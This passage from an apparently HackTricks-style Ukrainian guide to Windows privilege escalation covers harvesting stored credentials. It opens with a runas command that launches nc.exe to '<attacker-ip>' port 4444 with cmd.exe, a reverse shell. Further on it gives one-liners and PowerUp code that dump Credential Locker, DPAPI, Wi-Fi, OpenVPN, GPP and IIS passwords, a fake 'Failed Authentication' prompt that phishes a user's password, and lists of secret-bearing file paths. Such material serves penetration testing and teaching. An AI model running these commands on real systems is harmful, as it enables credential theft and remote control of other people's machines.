C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому вигляді у `PasswordVault` (також доступному як `Web Credentials` у `vaultcmd`) платформи Universal Windows Platform (UWP). Це сховище ізольоване в межах сеансу, і його можна розшифрувати нативними засобами без прав адміністратора або `SeDebugPrivilege`.

Виконайте цю команду PowerShell у активному сеансі користувача, щоб миттєво отримати дамп і розшифрувати всі збережені імена користувачів і паролі у відкритому вигляді:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних і переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Для суттєвого збільшення ентропії під час шифрування використовується секрет користувача або системи.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від секретів входу користувача**. У випадках системного шифрування використовуються секрети доменної автентифікації системи.

Зашифровані ключі RSA користувачів за допомогою DPAPI зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розміщений поруч із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Варто зазначити, що доступ до цього каталогу обмежено, тому переглянути його вміст за допомогою команди `dir` у CMD не можна, хоча це можна зробити через PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Для розшифрування можна використати **модуль mimikatz** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`).

**Файли облікових даних, захищені головним паролем,** зазвичай розташовані в:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Ви можете використовувати **модуль mimikatz** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
За допомогою модуля `sekurlsa::dpapi` можна **витягти багато** **masterkeys DPAPI** з **пам’яті** (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовуються для **скриптингу** й автоматизації, оскільки дають змогу зручно зберігати зашифровані облікові дані. Вони захищені за допомогою **DPAPI**, а це зазвичай означає, що розшифрувати їх може лише той самий користувач на тому самому комп’ютері, на якому їх було створено.

Експортовані облікові дані можуть мати довільну назву файлу або шлях `.xml`. Якщо скрипт або інвентаризація файлів указує на такий файл, визначте фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може розміщувати профілі в інших місцях](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Файл, який можна прочитати, — це лише зачіпка; [Windows `Export-Clixml` прив’язує зашифровані облікові дані до користувача й комп’ютера, які виконали експорт](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а будь-який відновлений обліковий запис повинен окремо мати належні права на потрібний сервіс. Спочатку перевірте шляхи й ACL, не виводячи зашифровані або відкриті значення під час звичайного переліку.

Щоб **розшифрувати** облікові дані PS із файлу, що їх містить, виконайте:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-з’єднання

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
і в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Менеджер облікових даних віддаленого робочого стола**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Використовуйте модуль **Mimikatz** `dpapi::rdg` із відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля **Mimikatz** `sekurlsa::dpapi` можна **витягти багато головних ключів DPAPI** з пам’яті

**mRemoteNG використовує інше сховище підключень.** Перевірте XML-файли, доступні для читання, у `%APPDATA%\mRemoteNG` і в документах користувача, зокрема файли зі звичайними назвами, як-от `config.xml`. Визначте схему підключень і зашифровані атрибути `Password`, перш ніж вважати XML-файл джерелом облікових даних. Збережене значення — це не пароль DPAPI/RDCMan; можливість його відновлення залежить від параметрів шифрування файлу та від того, чи використовувався власний головний пароль. Під час широкого пошуку не виводьте зашифровані значення.

**Експорти профілів Remote Desktop Plus** також можуть бути доступні для читання в каталогах користувача або спільній папці адміністрування. У застарілому експорті `profiles.xml` записи `Data/Profile` містять елементи `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент пароля потенційним джерелом облікових даних, але не виводьте його та не припускайте, що він зберігається у відкритому вигляді: [виробник зазначає](https://www.donkz.nl/), що захист профілю може бути прив’язаний до облікового запису й комп’ютера, на якому його створено, або налаштований менш суворо. Перш ніж покладатися на такий файл, з’ясуйте його походження та умови відновлення.

### Sticky Notes

Люди іноді зберігають паролі та іншу інформацію в застосунках для стікерів. Зазвичай застосунок Sticky Notes від Microsoft, що розповсюджується як пакет, зберігає нотатки за шляхом `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші або інші застосунки можуть використовувати інші сховища в профілі користувача, зокрема LevelDB. Перш ніж вважати відсутність SQLite-файлу доказом того, що нотаток немає, визначте встановлений застосунок і формат сховища.

Якщо Sticky Notes використовує журналювання випереджального запису SQLite, копія лише `plum.sqlite` може не містити нещодавно зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із цілісною копією бази даних і додавайте `plum.sqlite-shm`, якщо він доступний; індекс у спільній пам’яті можна перебудувати, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite щодо WAL](https://www.sqlite.org/wal.html). Нотатка з ім’ям облікового запису або паролем — лише потенційне джерело облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для використання зашифрованого запису менеджера паролів також потрібні фактичний ключ розшифрування та специфічна для застосунку інтерпретація, перш ніж такий запис можна буде вважати підтвердженням входу з вищими привілеями.

### AppCmd.exe

**Зверніть увагу: щоб відновити паролі з AppCmd.exe, потрібно мати права адміністратора та запускати його з рівнем цілісності High.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, налаштовано облікові **дані**, які можна **відновити**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних у реєстрі інструментів підтримки

У деяких старих інсталяціях програм для віддаленої підтримки під фіксованими ключами реєстру застосунку зберігаються назви параметрів, пов’язані з паролями. Наприклад, у версіях TeamViewer до 9 включно `SecurityPasswordAES` позначав налаштований статичний пароль сеансу, згідно з [поясненням постачальника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Маркер у назві параметра — лише підказка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, доступність для читання даних параметра, їхній формат і поточну поведінку автентифікації. Перехід від пароля для віддаленої підтримки до облікового запису Windows із вищими привілеями додатково потребує фактичного повторного використання пароля та наявності авторизації для цього облікового запису. Не виводьте зашифровані дані та відновлені паролі під час звичайного переліку.

### Спільні електронні таблиці із захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [Microsoft зазначає](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша обмежує редагування й не є функцією безпеки; сам по собі він не свідчить про шифрування вмісту книги. Перевіряйте лише файли, до яких маєте авторизований доступ і які стосуються завдання, та не виводьте можливі секрети під час широкого переліку. Самі по собі доступний для читання шлях `.xlsx`, захищений аркуш або прихований стовпець не доводять, що файл містить облікові дані чи що будь-який обліковий запис має вищі привілеї; окремо перевірте фактичні дані й поточні права облікових записів.

### Збережені патчі змін на CI-сервері

CI-сервер може зберігати надіслані зміни вихідного коду у своєму каталозі даних навіть після завершення збірки. [TeamCity описує](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` як місце зберігання змін для віддаленого запуску; каталог даних можна налаштувати, і він не обов’язково розташований у `ProgramData`. Доступний для читання патч може зберігати видалені або додані посилання на файл з обліковими даними, ключ шифрування чи скрипт, який використовує і те, й інше. Наприклад, у робочому процесі PowerShell `ConvertTo-SecureString -Key` потрібні і ключ AES, і зашифрований рядок; [Microsoft документує](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ передається окремо. Спершу перевірте лише доступні назви патчів, а потім — за наявності дозволу — потрібний вміст, не виводячи секрети під час звичайного переліку. Самі по собі шлях до патча, зашифроване значення або посилання на ключ не доводять наявність дійсних облікових даних чи доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Самописна ротація пароля локального адміністратора

Самописний засіб зміни пароля може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані для сховища даних — у доступному для читання файлі `.env` або поруч із бінарним файлом засобу оновлення. Перевірте разом заплановане завдання засобу оновлення, обліковий запис, ACL конфігураційних файлів, listener і дозволи сховища даних. Сховище даних, доступне лише через loopback, усе одно доступне локальному користувачеві з дійсними обліковими даними, але сама автентифікація не доводить наявність дозволу на читання відповідних записів. Якщо поруч із зашифрованими даними доступний seed або матеріал ключа, перш ніж покладатися на шифрування, перевірте точний алгоритм виведення ключа. Схема, що детерміновано виводить ключ AES з відкритого seed за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), непридатна для захисту такого пароля; Go зазначає, що цей пакет не призначений для криптографічно чутливої генерації випадкових даних. Перш ніж вважати відновлений пароль шляхом підвищення привілеїв, переконайтеся, що він чинний і належить обліковому запису з групи локальних адміністраторів. Самі по собі заплановане завдання, шлях до `.env` або зашифрований блок даних не доводять жодної з цих умов. Не виводьте паролі та матеріал ключа під час звичайного переліку.

Для керованих паролів локального адміністратора використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Його сховище на основі каталогу або Entra та засоби контролю доступу відрізняються від самописного локального сховища даних; [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) так само визначають, чи може автентифікований користувач сховища даних читати певний індекс.

### Архіви плагінів Java-сервера та повторне використання облікових даних

Деякі плагіни Java-серверів постачаються як архіви JAR у каталозі сервера `plugins`. Доступний для читання власний плагін може містити конфігурацію або байт-код із вбудованими обліковими даними служби. Перевіряйте архів лише за наявності дозволу та не виводьте відновлені секрети під час звичайного переліку. Сам шлях до плагіна не доводить наявність секрету, а відновлений пароль служби веде до вищих привілеїв лише тоді, коли він також чинний для облікового запису з вищими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на унікальні секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle щодо JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire, що використовує вбудовану базу даних, може зберігати `openfire.script` у `Openfire\embedded-db`. Якщо поточний обліковий запис може його читати, перевірте разом записи `OFUSER` і властивість `passwordKey`. У [документації Openfire щодо постачальника користувачів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому тексті або бути зашифрованими ключем, що зберігається у цій властивості. Відновлений пароль має значення для підвищення привілеїв лише тоді, коли він досі чинний для ідентичності з вищими привілеями; сама назва файлу не доводить ані доступу на читання, ані повторного використання облікових даних. Цей шлях — лише підказка для інвентаризації, тож не виводьте вміст бази даних і облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може показати налаштовані порти та мережевий інтерфейс прив’язки консолі адміністратора, навіть якщо використовується зовнішня база даних. Зазвичай Openfire прив’язує консоль адміністратора до loopback; за наявності запущеного listener локальний обліковий запис усе одно може звернутися до цієї адреси. Разом перевірте фактичний listener, авторизовану роль адміністратора, політику завантаження плагінів та ідентичність служби Openfire. Адміністратор, який може встановлювати плагін, може спричинити виконання його коду в контексті служби; це може надати високі привілеї, якщо служба працює як LocalSystem. Збіг пароля облікового запису або доступний для читання шлях конфігурації сам по собі не доводить доступу до консолі адміністратора чи виконання коду. Див. [посібник постачальника зі встановлення та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API для завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування цифровою криміналістикою

Конфігурації сервера Velociraptor, які зазвичай називаються `server.config.yaml`, можуть містити `CA.private_key` внутрішнього CA. Якщо користувач із нижчими привілеями може прочитати цей ключ, він може отримати змогу створити клієнтський сертифікат API. Чи призведе це до вищих привілеїв, залежить від ролей користувачів на сервері, доступності API та ідентичності, від імені якої працює сервер або цільовий агент. Клієнтська конфігурація містить інші дані; її наявність не доводить доступу до CA сервера. У деяких розгортаннях закритий ключ CA зберігають офлайн, тому доступна для читання конфігурація сервера може не містити ключа підпису.

На сервері Windows перевірте ACL **серверної** конфігурації в каталозі інсталяції та будь-яких захищених резервних копій. Одне з можливих розташувань: `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо шлях служби відрізняється, використовуйте його. Переконайтеся, що поточна ідентичність може читати файл і що `CA.private_key` справді присутній. Не виводьте закритий ключ у журнали чи результати переліку. У робочому процесі постачальника `config api_client` ключ CA використовується для видачі клієнтського сертифіката, але також потрібна ефективна роль на сервері; для її створення або зміни може знадобитися доступ на запис до сховища даних або перезапуск. Наявна привілейована серверна ідентичність може забезпечити шлях навіть за відсутності таких дозволів на запис. API-запити з правами на виконання запускаються в контексті відповідного сервера або агента, який може мати високі привілеї.

Захищайте конфігурацію сервера та резервні копії обмежувальними ACL, за можливості зберігайте ключ підпису CA офлайн і обмежуйте ролі API та доступ до listener. Див. [документацію Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) та [рекомендації щодо конфігурації безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Облікові дані PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його вбудоване зашифроване сховище може розташовуватися за адресою `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, тоді як експортована резервна копія сеансів може мати назву `sessions-backup.dat` і зберігатися в іншому місці. [Посібник SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначає, що експорти зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки; у [форумі підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказано розташування вбудованого сховища. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває пароль і не доводить, що збережені облікові дані досі дійсні або надають вищі привілеї.

### SSH-ключі вузлів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys у реєстрі

Приватні SSH-ключі можуть зберігатися в розділі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тому перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо ви знайдете будь-який запис у цьому шляху, імовірно, це збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Докладніше про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена й ви хочете, щоб вона автоматично запускалася під час завантаження системи, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, цей метод більше не працює. Я спробував створити кілька ssh-ключів, додати їх за допомогою `ssh-add` і увійти на комп’ютер через ssh. Розділ реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за асиметричним ключем.

### Файли автоматичного встановлення

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також ви можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Доступні для читання файли резервних копій Windows Imaging (`.wim`) також можуть містити офлайн-вулики `SAM`, `SECURITY` і `SYSTEM`. Насамперед перевіряйте локально доступні каталоги резервних копій або образів і переглядайте **назви елементів** образу, перш ніж щось із нього видобувати; сама назва файлу `.wim` не доводить, що в ньому доступні вулики, а типові `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. Спільний ресурс SMB — це окремий шлях доступу; перевіряйте його лише тоді, коли він входить до сфери перевірки. Див. [настанови Microsoft щодо образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідник файлів вуликів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Хмарні облікові дані

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл із назвою **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні облікові записи локального адміністратора на групі комп’ютерів за допомогою Group Policy Preferences (GPP). Однак цей метод мав значні недоліки безпеки. По-перше, об’єкти групової політики (GPO), що зберігалися у вигляді XML-файлів у SYSVOL, могли бути доступні будь-якому користувачеві домену. По-друге, паролі в цих GPP, зашифровані AES256 із використанням публічно задокументованого ключа за замовчуванням, міг розшифрувати будь-який автентифікований користувач. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, що містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити й усунути цю вразливість безпеки.

Шукайте ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

За допомогою crackmapexec отримати паролі:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Вебконфігурація IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви у вебкорені IIS

Старий ZIP-архів резервної копії, розміщений безпосередньо у вебкорені, з якого обслуговується сайт, може розкривати попередні файли конфігурації та облікові дані, які можна повторно використати. Перевірте налаштований фізичний шлях сайту й те, чи справді архів доступний через HTTP, перш ніж вважати це витоком. Стандартний шлях `C:\inetpub\wwwroot` — лише можливий варіант. Швидка локальна інвентаризація може вивести назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не доводить, що він містить секретні дані або що відновлені облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Запитайте облікові дані

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що прямо **просити** клієнта надати **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які деякий час тому містили **паролі** у **відкритому тексті** або Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

